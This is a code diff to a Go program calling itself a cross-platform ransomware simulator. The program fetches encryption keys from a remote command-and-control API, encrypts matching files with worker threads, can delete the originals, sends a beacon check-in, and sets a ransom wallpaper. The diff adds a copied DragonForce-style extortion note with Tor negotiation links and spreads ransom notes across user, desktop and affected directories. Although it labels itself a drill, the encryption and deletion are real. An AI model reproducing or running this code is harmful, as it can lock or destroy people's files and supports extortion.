@@ -26,26 +26,57 @@ import (
 	"time"
 )
 
-// --- 勒索软件特征常量 ---
+// VERSION --- 勒索软件特征常量 ---
 const VERSION = "v2.0-RansomSimulator-CrossPlatform"
 const API_URL = "https://rsa-uuid.api.yangzifun.org"
-const BEACON_URL = "http://bad-c2-server.api.yangzifun.org/beacon_check_in"
+const BEACON_URL = "https://bad-c2-server.api.yangzifun.org/beacon_check_in"
 
-// --- 勒索信内容 ---
+// RANSOM_NOTE_CONTENT --- 勒索信内容 ---
 const RANSOM_NOTE_CONTENT = `
 ========================= [ 你的所有文件都已被锁定! ] =========================
 
 不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，
 你的网络已经被完全攻陷。
 
-你的重要文件 - 文档、照片、数据库、备份 - 都已被强大的军用级加密算法
-AES-256 + RSA-2048 加密。
-没有任何后门或捷径。恢复它们的唯一方法是从我们这里购买唯一的解密密钥。
+As you can see you have been attacked by a ransomware program! We The DragonForce Ransomware Cartel offer you to make a deal with us. We can make a deal with you, all you need to do is contact us by following the instructions below. 
+We are in no way connected to politics, we always keep our word. You have a chance to decrypt your files and avoid being published on our blog! Use this opportunity and also don't waste your time. 
 
-任何自行恢复文件的尝试都将导致它们的永久性损坏。
-禁用或重启此设备也可能导致永久性的数据丢失。
+- # 1 Communication Process, 
 
-要开始恢复流程，你需要联系我们并提供你的专属ID。
+	In order to contact us you need to click on the special link below, which is listed in #2. 
+	After that the negotiation process begins, in which you have the opportunity to request several things from us, 
+		
+		1. make a test decrypt.
+		2. get a list of the files stolen from you.
+		
+	At the conclusion of our negotiations we agree on a price, we set the price ourselves based on your income/your insurance. 
+	We scrutinize your documents and are well aware of how much income your company has per year.
+
+- # 2 Access to the meeting room, 
+
+	To access us please download Tor Browser which is available here. (https://www.torproject.org/)
+	Once you download the special anonymous browser you need to follow this link, http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion
+	Your unique ID: %s
+
+
+
+- # 3 Recommendations, 
+
+	Do not try to recover your files with third-party programs, you will only do harm.
+	Do not turn off / reboot your computer.
+	Be courteous in our meeting room. 
+	Do not procrastinate. 
+
+- # 4 Blog and News,
+
+	Blog: http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion
+	DragonNews: http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion/news
+
+
+
+本程序不会对加密的原文件进行删除操作，如遇原文件丢失，可通过下方链接获取私钥：
+
+https://encrypt.yangzifun.org/
 
 你的专属ID是: %s
 
@@ -163,6 +194,8 @@ func main() {
 
 	var stats counters
 	var finalUUID = "C2服务器连接失败"
+	// 新增变量，用于存储所有成功加密文件所在的目录 (去重)
+	var encryptedFileDirsForNotes []string
 
 	if *dryRunFlag {
 		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
@@ -173,14 +206,19 @@ func main() {
 	} else {
 		fmt.Println("\n[阶段 3: 载荷部署]")
 		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
-		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
+		// ！！！修复：捕捉 runEncryptionWorkers 的返回值！！！
+		encryptedFileDirsForNotes = runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
 		fmt.Println("\n[+] 载荷执行完毕。")
 	}
 
 	if !*dryRunFlag {
 		fmt.Println("\n[阶段 4: 勒索]")
 		fmt.Println("[*] 正在向全系统投放勒索信...")
-		dropRansomNotes(fmt.Sprintf(RANSOM_NOTE_CONTENT, finalUUID))
+
+		// 修复：传入两个相同的UUID参数，以填充勒索信中的两个 %s 占位符
+		noteContent := fmt.Sprintf(RANSOM_NOTE_CONTENT, finalUUID, finalUUID)
+		// ！！！修复：将收集到的加密文件目录作为第二个参数传入！！！
+		dropRansomNotes(noteContent, encryptedFileDirsForNotes)
 		fmt.Println("[+] 勒索信投放完毕。")
 		createRansomWallpaper()
 	}
@@ -204,13 +242,12 @@ func main() {
 	countdown("此终端将在", 10)
 }
 
-// --- 锁机制实现 (修复了 undefined 错误) ---
+// --- 锁机制实现 ---
 
 func createSingleInstanceLock() bool {
 	var err error
 	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
 
-	// O_EXCL 确保如果文件已存在则创建失败，实现单例锁
 	var file *os.File
 	file, err = os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
 	if err != nil {
@@ -292,25 +329,52 @@ func simulateDestructiveActions() {
 	time.Sleep(1 * time.Second)
 }
 
-func dropRansomNotes(content string) {
-	dirs := getUserDirs()
-	desktopPath := getDesktopPath()
-	if desktopPath != "" {
-		found := false
-		for _, d := range dirs {
-			if d == desktopPath {
-				found = true
-				break
-			}
-		}
-		if !found {
-			dirs = append(dirs, desktopPath)
+// 修改后的 dropRansomNotes 函数：在用户目录、桌面以及加密文件所在的目录投放勒索信
+func dropRansomNotes(content string, encryptedFileDirs []string) {
+	// 收集所有目标目录并去重
+	targetDirs := make(map[string]bool)
+
+	// 添加用户主目录及其常见子目录
+	for _, dir := range getUserDirsWithSubDirs() {
+		if dir != "" {
+			targetDirs[dir] = true
 		}
 	}
-	for _, dir := range dirs {
-		if _, err := os.Stat(dir); err == nil {
-			notePath := filepath.Join(dir, ransomNoteFileName)
-			os.WriteFile(notePath, []byte(content), 0644)
+
+	// 添加桌面目录
+	desktopPath := getDesktopPath()
+	if desktopPath != "" {
+		targetDirs[desktopPath] = true
+	}
+
+	// 添加所有加密文件所在的目录
+	for _, dir := range encryptedFileDirs {
+		if dir != "" {
+			targetDirs[dir] = true
+		}
+	}
+
+	// 将去重后的目录转换为切片
+	var allUniqueDirs []string
+	for dir := range targetDirs {
+		allUniqueDirs = append(allUniqueDirs, dir)
+	}
+
+	fmt.Printf("[*] 在 %d 个位置投放勒索信...\n", len(allUniqueDirs))
+	for _, dir := range allUniqueDirs {
+		// 确保目录存在，如果不存在则尝试创建
+		if _, err := os.Stat(dir); os.IsNotExist(err) {
+			if err := os.MkdirAll(dir, 0755); err != nil {
+				// 创建失败，跳过该目录
+				continue
+			}
+		}
+
+		notePath := filepath.Join(dir, ransomNoteFileName)
+		if err := os.WriteFile(notePath, []byte(content), 0644); err == nil {
+			fmt.Printf("  ✓ 勒索信已投放至: %s\n", notePath)
+		} else {
+			fmt.Printf("  x 无法在 %s 投放勒索信: %v\n", notePath, err)
 		}
 	}
 }
@@ -395,9 +459,24 @@ func scanFiles(extFilter map[string]bool, scanRoots []string) []string {
 	return filesToProcess
 }
 
-func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) {
+// 修改 runEncryptionWorkers 函数以返回加密文件所在目录列表 (去重)
+func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUUID *string, removeOriginal bool) []string {
 	jobs := make(chan string, len(files))
 	var wg sync.WaitGroup
+
+	// 用于收集加密文件所在目录，线程安全
+	var dirsMutex sync.Mutex
+	encryptedFileDirsMap := make(map[string]bool) // 使用map去重
+
+	// 添加目录到集合（去重处理）
+	addDir := func(dir string) {
+		dirsMutex.Lock()
+		defer dirsMutex.Unlock()
+
+		if dir != "" && dir != "." && dir != "/" { // 过滤掉无效目录
+			encryptedFileDirsMap[dir] = true
+		}
+	}
 
 	log, err := newFileLog("ransom_log.txt")
 	if err != nil {
@@ -410,7 +489,7 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	if err != nil {
 		fmt.Printf("\n[致命错误] 无法从 C2 服务器 '%s' 获取加密密钥: %v。所有线程将失败。任务中止。\n", API_URL, err)
 		stats.failed.Add(uint64(len(files)))
-		return
+		return nil // 致命错误，返回空列表
 	}
 
 	*outUUID = resp.UUID
@@ -421,7 +500,20 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 
 	for w := 0; w < numWorkers; w++ {
 		wg.Add(1)
-		go worker(w+1, jobs, &wg, stats, log, resp, removeOriginal)
+		go func(workerID int) {
+			defer wg.Done()
+			for file := range jobs {
+				err := processFile(file, resp.PublicKeyPEM, removeOriginal)
+				if err != nil {
+					stats.failed.Add(1)
+				} else {
+					stats.success.Add(1)
+					// 记录加密文件所在目录
+					dir := filepath.Dir(file)
+					addDir(dir)
+				}
+			}
+		}(w + 1)
 	}
 
 	for _, file := range files {
@@ -452,18 +544,13 @@ func runEncryptionWorkers(files []string, numWorkers int, stats *counters, outUU
 	close(done)
 	totalFiles := uint64(len(files))
 	fmt.Printf("\r[*] 加密完成。 [100.00%%] (%d/%d) \n", totalFiles, totalFiles)
-}
 
-func worker(id int, jobs <-chan string, wg *sync.WaitGroup, stats *counters, log *fileLog, apiResp *APIResponse, removeOriginal bool) {
-	defer wg.Done()
-	for file := range jobs {
-		err := processFile(file, apiResp.PublicKeyPEM, removeOriginal)
-		if err != nil {
-			stats.failed.Add(1)
-		} else {
-			stats.success.Add(1)
-		}
+	// 将map中的唯一目录转换为切片返回
+	var uniqueEncryptedDirs []string
+	for dir := range encryptedFileDirsMap {
+		uniqueEncryptedDirs = append(uniqueEncryptedDirs, dir)
 	}
+	return uniqueEncryptedDirs
 }
 
 func fetchKeysFromAPI() (*APIResponse, error) {
@@ -526,12 +613,33 @@ func shouldEncrypt(filePath string, extFilter map[string]bool) bool {
 	return extFilter[strings.ToLower(filepath.Ext(filePath))]
 }
 
-func getUserDirs() []string {
-	home, _ := os.UserHomeDir()
-	if home == "" {
-		return []string{}
+// 修改 getUserDirsWithSubDirs 函数以返回更多用户相关目录（Linux专属）
+func getUserDirsWithSubDirs() []string {
+	home, err := os.UserHomeDir()
+	if home == "" || err != nil {
+		return []string{"/tmp"} // 备用目录，如果用户主目录获取失败
 	}
-	return []string{home}
+
+	var dirs []string
+	// 总是添加用户主目录
+	dirs = append(dirs, home)
+
+	// Linux系统特有：添加常见用户子目录
+	if runtime.GOOS == "linux" {
+		linuxSubDirs := []string{
+			"Documents", "Downloads", "Public", "Templates", "Music", "Pictures", "Videos",
+		}
+
+		for _, subDir := range linuxSubDirs {
+			dir := filepath.Join(home, subDir)
+			// 检查目录是否存在再添加
+			if _, err := os.Stat(dir); err == nil {
+				dirs = append(dirs, dir)
+			}
+		}
+	}
+
+	return dirs
 }
 
 func getKeys(m map[string]bool) []string {
@@ -554,7 +662,19 @@ func getDesktopPath() string {
 		if xdg := os.Getenv("XDG_DESKTOP_DIR"); xdg != "" {
 			return xdg
 		}
-		return filepath.Join(home, "Desktop")
+		// 尝试多个可能的桌面目录
+		possibleDirs := []string{
+			filepath.Join(home, "Desktop"),
+			filepath.Join(home, "桌面"), // 考虑中文系统
+			// 备用，如果以上都不存在，可能home本身就是最顶层目录或没有专门的桌面文件夹
+			home,
+		}
+		for _, dir := range possibleDirs {
+			if _, err := os.Stat(dir); err == nil {
+				return dir
+			}
+		}
+		return home // fallback
 	default:
 		return home
 	}
@@ -577,6 +697,13 @@ func processFile(filePath string, publicKeyStr string, removeOriginal bool) erro
 	if err != nil {
 		return err
 	}
+
+	// !!! ！！！移除每次加密文件都投放勒索信的逻辑！！！ ！！！
+	// 因为勒索信的投放会在 encryptionWorkers 完成后统一由 dropRansomNotes 函数处理，避免重复。
+	// dir := filepath.Dir(filePath)
+	// notePath := filepath.Join(dir, ransomNoteFileName)
+	// noteContent := fmt.Sprintf("此文件夹下的文件已被加密: %s", filepath.Base(filePath))
+	// os.WriteFile(notePath, []byte(noteContent), 0644)
 
 	if removeOriginal {
 		err = os.Remove(filePath)
